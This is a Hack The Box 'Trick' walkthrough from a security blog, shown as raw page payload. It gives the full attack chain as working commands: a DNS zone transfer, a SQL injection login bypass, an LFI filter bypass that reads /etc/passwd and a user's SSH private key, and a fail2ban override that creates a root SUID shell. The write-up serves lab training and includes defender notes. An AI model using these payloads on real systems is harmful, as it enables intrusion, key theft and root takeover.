1:"$Sreact.fragment"
2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-e5159b70950204e3.js"],""]
3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-e5159b70950204e3.js"],"ThemeToggle"]
4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-e5159b70950204e3.js"],"MobileNavigation"]
f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-e5159b70950204e3.js"],"ArticleReadingGuide"]
11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-e5159b70950204e3.js"],"ThemeAutoReset"]
13:I[484,[],"OutletBoundary"]
14:"$Sreact.suspense"
0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Trick Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A DNS zone transfer revealed the payroll site, SQL injection and an LFI bypass exposed Michael's SSH key, and his writable fail2ban action directory plus restart privilege replaced the ban command with a root-owned setuid shell."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:55:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-trick-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Trick machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Trick machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"cveUD5DqTYPDNQt0kw3FH"}
5:["$","$Lf",null,{"headings":[{"id":"attack-chain","label":"Attack chain"},{"id":"step-1-port-scanning","label":"Step 1: Port Scanning"},{"id":"step-2-dns-zone-transfer","label":"Step 2: DNS Zone Transfer"},{"id":"step-3-hosts-file-setup","label":"Step 3: Hosts File Setup"},{"id":"step-4-sql-injection-auth-bypass","label":"Step 4: SQL Injection Auth Bypass"},{"id":"step-5-subdomain-fuzzing","label":"Step 5: Subdomain Fuzzing"},{"id":"step-6-lfi-discovery-and-exploitation","label":"Step 6: LFI Discovery & Exploitation"},{"id":"step-7-reading-michael-s-ssh-key","label":"Step 7: Reading michael's SSH Key"},{"id":"step-8-ssh-access-and-user-flag","label":"Step 8: SSH Access & User Flag"},{"id":"step-9-privilege-escalation-via-fail2ban","label":"Step 9: Privilege Escalation via fail2ban"},{"id":"root-flag","label":"Root Flag"},{"id":"lessons-learned","label":"Lessons Learned"}]}]
6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit be86ff84b680",""]}]]]}]
7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Trick, Linux, Easy",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
10:T53da,<p><strong>Difficulty:</strong> Easy<br><strong>OS:</strong> Linux<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.227.180  </p>
<hr>



<h2 id="attack-chain">Attack chain</h2>
<p>Trick chains DNS discovery, SQL injection, LFI, SSH access, and fail2ban abuse.</p>
<p><strong>Enumerate → Exploit → Escalate</strong></p>
<p>Every action has a reason. You never blindly run tools - you ask:</p>
<ul>
<li><em>What am I looking for?</em></li>
<li><em>What does this tell me?</em></li>
<li><em>What are my next options based on this information?</em></li>
</ul>
<p>This machine is a clear example of <strong>chaining small vulnerabilities</strong> - no single step gives you root. You chain DNS info → SQLi → subdomain discovery → LFI → SSH key → fail2ban abuse. Each step unlocks the next.</p>
<hr>
<h2 id="step-1-port-scanning">Step 1: Port Scanning</h2>
<h3 id="what-we-ran">What we ran</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.180
nmap -p 22,25,53,80 -sCV 10.129.227.180
</code></pre>
<h3 id="results">Results</h3>
<pre><code>22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
</code></pre>

<p>Port scanning is always the first step. You can't attack what you don't know exists. We use two nmap passes:</p>
<ol>
<li><strong><code>-p- --min-rate 10000</code></strong> : scan all 65535 ports quickly. Default nmap only scans the top 1000. Services on unusual ports get missed.</li>
<li><strong><code>-sCV</code></strong> : on the discovered ports, run service detection (<code>-sV</code>) and default scripts (<code>-sC</code>) to get version info and basic enumeration.</li>
</ol>

<p>Look at what's <em>unusual</em>. Every machine has SSH (22) and HTTP (80) - that's expected. But <strong>port 25 (SMTP)</strong> and <strong>port 53 (DNS)</strong> stand out on what appears to be a web server. Ask yourself: <em>why would a web server be running a mail server and a DNS server?</em> These are your attack surface hints. note unusual services - they almost always matter.</p>
<hr>
<h2 id="step-2-dns-zone-transfer">Step 2: DNS Zone Transfer</h2>
<h3 id="what-we-ran-2">What we ran</h3>
<pre><code class="language-bash" data-language="bash">dig axfr trick.htb @10.129.227.180
</code></pre>
<h3 id="results-2">Results</h3>
<pre><code>preprod-payroll.trick.htb.  604800  IN  CNAME  trick.htb.
</code></pre>

<p>DNS on port 53 is interesting because DNS servers store a map of all hostnames for a domain. A <strong>zone transfer (AXFR)</strong> is a legitimate DNS feature designed to let secondary DNS servers sync records from a primary server. When misconfigured (no IP restrictions), anyone can request a full dump of all DNS records.</p>
<p>The <code>dig axfr</code> command asks the DNS server at 10.129.227.180 to give us all records for the <code>trick.htb</code> zone.</p>
<h3 id="what-this-reveals">What this reveals</h3>
<p>The zone transfer reveals <code>preprod-payroll.trick.htb</code> - a subdomain that wouldn't appear in a normal port scan or web crawl. This is a <strong>virtual host</strong> - the same IP serves different content depending on what <code>Host:</code> header you send in your HTTP request.</p>

<p>DNS is a useful source for reconnaissance. Before zone transfers were locked down, attackers could map entire corporate networks just by asking DNS servers. Even today, misconfigured DNS on CTF machines (and real targets) leaks internal hostnames, development environments, staging servers, and admin panels. Check DNS when port 53 is open.</p>
<hr>
<h2 id="step-3-hosts-file-setup">Step 3: Hosts File Setup</h2>
<h3 id="what-we-ran-3">What we ran</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.227.180 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
</code></pre>

<p>Virtual hosting means the web server uses the HTTP <code>Host:</code> header to decide which site to serve. Your browser normally resolves hostnames through DNS, but this is an HTB machine - its DNS isn't on the public internet.</p>
<p>By adding entries to <code>/etc/hosts</code>, we force our machine to resolve these hostnames to the target IP without needing public DNS. This is essential for accessing virtual hosts.</p>

<p>Every subdomain you discover needs to go into <code>/etc/hosts</code> immediately. If you skip this and try to browse directly, you'll get the default site or a 404. keep your hosts file updated as you discover new subdomains throughout the engagement.</p>
<hr>
<h2 id="step-4-sql-injection-auth-bypass">Step 4: SQL Injection Auth Bypass</h2>
<h3 id="what-we-found">What we found</h3>
<p>Browsing to <code>http://preprod-payroll.trick.htb</code> reveals an "Employee's Payroll Management System" login form. This is real, publicly available software - a quick Google of the title confirms it.</p>
<h3 id="what-we-ran-4">What we ran</h3>
<pre><code class="language-bash" data-language="bash">curl -s -c cookies.txt -b cookies.txt -X POST \
  "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  -d "username=' or 1=1-- -&amp;password=REDACTED"
</code></pre>
<h3 id="result-1-login-successful">Result: <code>1</code> (login successful)</h3>

<p>The backend SQL query looks something like this:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '[input]' AND password = 'REDACTED';
</code></pre>
<p>When we inject <code>' or 1=1-- -</code> as the username, the query becomes:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'REDACTED';
</code></pre>
<p>The <code>-- -</code> comments out the rest of the query. <code>OR 1=1</code> is always true, so the query returns all users. The application sees a successful login and grants admin access.</p>
<h3 id="why-we-tried-this">Why we tried this</h3>
<p>The login form is the natural entry point. Any time you see a login form backed by a database (and PHP/MySQL is extremely common), SQL injection should be your first test. A single quote <code>'</code> in the username field breaking the page is often the first indicator.</p>

<p>SQL injection auth bypasses are one of the oldest and most reliable attacks. The pattern <code>' or 1=1-- -</code> is a classic. Real software downloaded from the internet (like this Payroll Management System) is frequently vulnerable because developers prioritize features over security. When you identify off-the-shelf software, also search for CVEs - this specific bypass is <strong>CVE-2022-28468</strong>.</p>
<hr>
<h2 id="step-5-subdomain-fuzzing">Step 5: Subdomain Fuzzing</h2>
<h3 id="what-we-ran-5">What we ran</h3>
<pre><code class="language-bash" data-language="bash">wfuzz -u http://trick.htb \
  -H "Host: preprod-FUZZ.trick.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hh 5480 -t 50
</code></pre>

<pre><code>000000254:   200    178 L    631 W    9660 Ch    "marketing"
</code></pre>
<p>Found: <code>preprod-marketing.trick.htb</code></p>

<p>The zone transfer gave us <code>preprod-payroll</code>. The <code>preprod-</code> prefix is a naming pattern. Developers often follow consistent naming conventions for their environments (preprod, staging, dev, test). By fuzzing for other <code>preprod-*</code> subdomains, we discover more attack surface.</p>
<p><code>wfuzz</code> works by sending HTTP requests, each time with a different value in the <code>Host:</code> header (where <code>FUZZ</code> gets replaced by each word in the list). The <code>--hh 5480</code> flag filters out responses with 5480 characters - that's the size of the default homepage, so we only see responses that are <em>different</em>.</p>
<h3 id="added-to-hosts">Added to hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
</code></pre>

<p>Do not assume the zone transfer gave you everything. DNS misconfigurations may only expose some records. Fuzzing for virtual hosts is an independent discovery technique that doesn't rely on DNS at all - it directly asks the web server. The combination of both techniques gives you maximum coverage.</p>
<hr>
<h2 id="step-6-lfi-discovery-and-exploitation">Step 6: LFI Discovery &amp; Exploitation</h2>
<h3 id="what-we-observed">What we observed</h3>
<p>Browsing to <code>preprod-marketing.trick.htb</code>, we notice the URL structure:</p>
<pre><code>http://preprod-marketing.trick.htb/index.php?page=services.html
</code></pre>
<p>The <code>page=</code> parameter tells the server which file to include. This is a classic pattern for <strong>Local File Inclusion (LFI)</strong>.</p>
<h3 id="the-vulnerable-code">The vulnerable code</h3>
<p>Reading the source (via SQL injection file read from the payroll site), the marketing site's <code>index.php</code> contains:</p>
<pre><code class="language-php" data-language="php">$file = $_GET['page'];
if(!isset($file) || ($file=="index.php")) {
    include("/var/www/market/home.html");
} else {
    include("/var/www/market/".str_replace("../","",$file));
}
</code></pre>
<h3 id="the-filter-bypass">The filter bypass</h3>
<p>The developer tried to prevent path traversal by removing <code>../</code> with <code>str_replace</code>. This is <strong>insecure</strong> because <code>str_replace</code> only removes the pattern once, non-recursively. The trick:</p>
<pre><code>Input:  ....//....//etc/passwd
After:  ../  ../  etc/passwd   ← str_replace removes ../ once
Result: ../../etc/passwd        ← which IS a valid traversal
</code></pre>
<p>So <code>....//</code> becomes <code>../</code> after the filter runs.</p>
<h3 id="testing-lfi">Testing LFI</h3>
<pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
</code></pre>
<p>This returns the contents of <code>/etc/passwd</code> - LFI confirmed.</p>

<p>LFI lets you read any file on the server that the PHP process has permission to read. This includes:</p>
<ul>
<li><code>/etc/passwd</code> : list of users</li>
<li>SSH private keys</li>
<li>Config files with passwords</li>
<li>Source code of other applications</li>
<li>Log files (can lead to RCE via log poisoning)</li>
</ul>

<p>Any time you see a <code>page=</code>, <code>file=</code>, <code>path=</code>, <code>include=</code>, or similar parameter in a URL, test for LFI immediately. The <code>str_replace</code> defense is a well-known bad practice - a blacklist approach to security almost always fails because attackers find creative ways around it. Whitelisting (only allowing specific known-good values) is the correct defense.</p>
<hr>
<h2 id="step-7-reading-michael-s-ssh-key">Step 7: Reading michael's SSH Key</h2>
<h3 id="what-we-ran-6">What we ran</h3>
<pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
</code></pre>
<h3 id="why-michael">Why michael?</h3>
<p>From the <code>/etc/passwd</code> file we read earlier, michael is the only non-root user with a login shell:</p>
<pre><code>michael:x:1001:1001::/home/michael:/bin/bash
</code></pre>
<p>Also, the nginx config (found earlier via SQL injection file read) reveals that the marketing site runs PHP as michael via <code>php7.3-fpm-michael.sock</code>. This means the PHP process has michael's file permissions - including read access to michael's home directory.</p>
<h3 id="why-ssh-keys">Why SSH keys?</h3>
<p>SSH keys in <code>~/.ssh/id_rsa</code> are private keys used for passwordless SSH authentication. If the public key (<code>id_rsa.pub</code>) is in <code>authorized_keys</code> (which is the default setup), we can use the private key to log in as that user without knowing their password.</p>
<h3 id="saving-and-using-the-key">Saving and using the key</h3>
<pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa" &gt; /tmp/michael_id_rsa
chmod 600 /tmp/michael_id_rsa
</code></pre>
<p>The <code>chmod 600</code> is critical - SSH refuses to use private key files that are readable by others (a security feature of the SSH client).</p>

<p>Once you have LFI as a specific user, immediately look for SSH keys. <code>~/.ssh/id_rsa</code> is the default location and exists on many of Linux systems. This is often faster and more reliable than trying to achieve code execution through log poisoning or mail injection. take the path of least resistance.</p>
<hr>
<h2 id="step-8-ssh-access-and-user-flag">Step 8: SSH Access &amp; User Flag</h2>
<h3 id="what-we-ran-7">What we ran</h3>
<pre><code class="language-bash" data-language="bash">ssh -i /tmp/michael_id_rsa michael@10.129.227.180
</code></pre>

<pre><code>michael@trick:~$ cat user.txt
a20a41[redacted]af5aa46bd
</code></pre>

<p>After getting a shell, the first things to check are always:</p>
<ol>
<li><strong>Who am I?</strong> : <code>id</code></li>
<li><strong>What groups am I in?</strong> : <code>id</code> (check for unusual groups)</li>
<li><strong>What can I run as root?</strong> : <code>sudo -l</code></li>
<li><strong>What's in my home directory?</strong> : <code>ls -la ~</code></li>
<li><strong>What other users exist?</strong> : <code>cat /etc/passwd</code></li>
</ol>
<p>Notice michael is in the <code>security</code> group - a non-standard group. This is a flag that something unusual has been configured. investigate non-standard groups.</p>
<hr>
<h2 id="step-9-privilege-escalation-via-fail2ban">Step 9: Privilege Escalation via fail2ban</h2>
<h3 id="discovery">Discovery</h3>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p>Output:</p>
<pre><code>(root) NOPASSWD: /etc/init.d/fail2ban restart
</code></pre>
<p>Michael can restart fail2ban as root without a password.</p>
<pre><code class="language-bash" data-language="bash">find / -group security 2&gt;/dev/null
</code></pre>
<p>Output:</p>
<pre><code>/etc/fail2ban/action.d
</code></pre>
<p>The <code>action.d</code> directory is writable by the <code>security</code> group:</p>
<pre><code>drwxrwx--- 2 root security 4096 action.d
</code></pre>
<h3 id="understanding-fail2ban">Understanding fail2ban</h3>
<p>Fail2ban is a security tool that monitors log files for repeated failed login attempts and bans offending IPs using firewall rules (iptables). Its configuration has three parts:</p>
<ul>
<li><strong>Filters</strong> : regex patterns to detect failures in log files</li>
<li><strong>Actions</strong> : what to do when a threshold is hit (e.g., add an iptables rule)</li>
<li><strong>Jails</strong> : connect a filter to an action for a specific service</li>
</ul>
<p>The default action for SSH banning is <code>iptables-multiport</code>, which calls <code>iptables</code> (defined in <code>iptables-common.conf</code>) to block the IP.</p>
<h3 id="the-vulnerability">The vulnerability</h3>
<p><code>iptables-common.conf</code> has this directive:</p>
<pre><code class="language-ini" data-language="ini">[INCLUDES]
after = iptables-common.local
</code></pre>
<p>The <code>after =</code> directive means fail2ban will load <code>iptables-common.local</code> after the main config, allowing values to be overridden. Crucially, <strong>this file doesn't exist yet</strong> - and we can create new files in <code>action.d</code> (we just can't overwrite existing ones).</p>
<p>The <code>iptables</code> variable in <code>iptables-common.conf</code> defines the actual command called when banning:</p>
<pre><code class="language-ini" data-language="ini">iptables = iptables &lt;lockingopt&gt;
</code></pre>
<p>We can override this in our new <code>iptables-common.local</code> to point to our own malicious script.</p>
<h3 id="the-exploit-step-by-step">The exploit: step by step</h3>
<p><strong>1. Create the malicious "iptables" script:</strong></p>
<pre><code class="language-bash" data-language="bash">echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod 4777 /tmp/bash' &gt; /tmp/iptables
chmod +x /tmp/iptables
</code></pre>
<p>This script, when run as root by fail2ban, copies bash to <code>/tmp/bash</code> and sets the SUID bit. SUID means the binary runs with the file owner's permissions (root), regardless of who executes it.</p>
<p><strong>2. Create the fail2ban override:</strong></p>
<pre><code class="language-bash" data-language="bash">echo -e '[Init]\niptables = /tmp/iptables &lt;lockingopt&gt;' &gt; /etc/fail2ban/action.d/iptables-common.local
</code></pre>
<p>This tells fail2ban to use our malicious script instead of the real iptables when banning.</p>
<p><strong>3. Restart fail2ban to load the new config:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo /etc/init.d/fail2ban restart
</code></pre>
<p>Fail2ban restarts as root and loads our override.</p>
<p><strong>4. Trigger a ban by making 5+ failed SSH attempts:</strong></p>
<pre><code class="language-bash" data-language="bash">for i in {1..7}; do sshpass -p REDACTED ssh -o StrictHostKeyChecking=no wronguser@10.129.227.180 2&gt;/dev/null; done
</code></pre>
<p>After 5 failures (the <code>maxretry</code> threshold), fail2ban fires the <code>actionban</code> command - which calls our fake iptables script - which runs as root - which creates <code>/tmp/bash</code> with SUID.</p>
<p><strong>5. Exploit the SUID bash:</strong></p>
<pre><code class="language-bash" data-language="bash">/tmp/bash -p
</code></pre>
<p>The <code>-p</code> flag tells bash to preserve the effective UID (euid=root) instead of dropping it. Without <code>-p</code>, bash would drop the SUID privilege as a security measure.</p>

<p>Fail2ban runs as root. When it executes our fake iptables binary, that process inherits root privileges. The <code>cp /bin/bash /tmp/bash; chmod 4777</code> command creates a root-owned SUID binary we can use to get a root shell at any time.</p>

<p>The privilege escalation chain here requires connecting several dots:</p>
<ol>
<li><code>sudo -l</code> → can restart fail2ban (most people would look at GTFOBins and stop here)</li>
<li><code>id</code> → in <code>security</code> group (non-standard, investigate it)</li>
<li><code>find / -group security</code> → the <code>security</code> group owns <code>action.d</code></li>
<li>Understanding fail2ban's include/override mechanism → <code>iptables-common.local</code> doesn't exist, we can create it</li>
<li>Knowing that fail2ban runs as root → our malicious command runs as root</li>
</ol>
<p>The lesson is to look for a chain of small misconfigurations rather than one decisive vulnerability.</p>
<hr>
<h2 id="root-flag">Root Flag</h2>
<pre><code class="language-bash" data-language="bash">bash-5.0# cat /root/root.txt
7a15f29[redacted]c9b01c2d
</code></pre>
<hr>
<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="vulnerabilities-exploited">Vulnerabilities exploited</h3>
<table aria-label="Vulnerabilities exploited data table">
<thead>
<tr>
<th scope="col">Vulnerability</th>
<th scope="col">Location</th>
<th scope="col">Impact</th>
</tr>
</thead>
<tbody><tr>
<td>DNS zone transfer unrestricted</td>
<td>Port 53</td>
<td>Subdomain enumeration</td>
</tr>
<tr>
<td>SQL injection (CVE-2022-28468)</td>
<td>Preprod-payroll login</td>
<td>Auth bypass, file read</td>
</tr>
<tr>
<td>LFI via path traversal</td>
<td>Preprod-marketing <code>?page=</code></td>
<td>Read arbitrary files as michael</td>
</tr>
<tr>
<td>Insecure <code>str_replace</code> Filter</td>
<td>Marketing <code>index.php</code></td>
<td>Filter bypass</td>
</tr>
<tr>
<td>SSH private key exposure</td>
<td><code>/home/michael/.ssh/id_rsa</code></td>
<td>SSH access as michael</td>
</tr>
<tr>
<td>Fail2ban writable action.d</td>
<td><code>/etc/fail2ban/action.d/</code></td>
<td>Arbitrary command execution as root</td>
</tr>
<tr>
<td>NOPASSWD sudo on fail2ban</td>
<td>Sudoers</td>
<td>Ability to reload malicious config</td>
</tr>
</tbody></table>
<h3 id="review-notes-for-defenders">Review notes for defenders</h3>
<ol>
<li><strong>Restrict DNS zone transfers</strong> to specific trusted IPs only</li>
<li><strong>Use prepared statements</strong> for all SQL queries - never concatenate user input</li>
<li><strong>Do not use blacklist filtering</strong> (str_replace, str_ireplace) for security - use a whitelist</li>
<li><strong>Restrict SSH key permissions</strong> and don't leave private keys world-readable</li>
<li><strong>Audit group permissions</strong> : non-standard groups with write access to security tool configs are dangerous</li>
<li><strong>NOPASSWD sudo entries</strong> dramatically reduce the effort needed to escalate from a compromised account to root</li>
</ol>
<h3 id="review-notes-for-attackers">Review notes for attackers</h3>
<ol>
<li>Check <strong>every unusual open port</strong> : DNS and SMTP both contributed here</li>
<li> <strong>Fuzz for virtual hosts</strong> when you see a web server</li>
<li><strong>LFI → SSH key</strong> is often faster than LFI → RCE</li>
<li>After getting a shell: <strong><code>sudo -l</code> and <code>id</code> immediately</strong> : always</li>
<li>Non-standard groups in <code>id</code> output are almost always relevant to privilege escalation</li>
<li>Understanding <em>how</em> a tool works (fail2ban's include mechanism) is more powerful than just knowing it exists</li>
</ol>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-twomillion-walkthrough","children":[["$","span",null,{"children":"More recent in Hack The Box"}],["$","strong",null,{"children":"Hack The Box: TwoMillion Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:58:05.000Z","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",126," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-travel-walkthrough","children":[["$","span",null,{"children":"Earlier in Hack The Box"}],["$","strong",null,{"children":"Hack The Box: Travel Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:54:17.000Z","children":"11 Jun 2026"}]]}]}]]}]
c:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
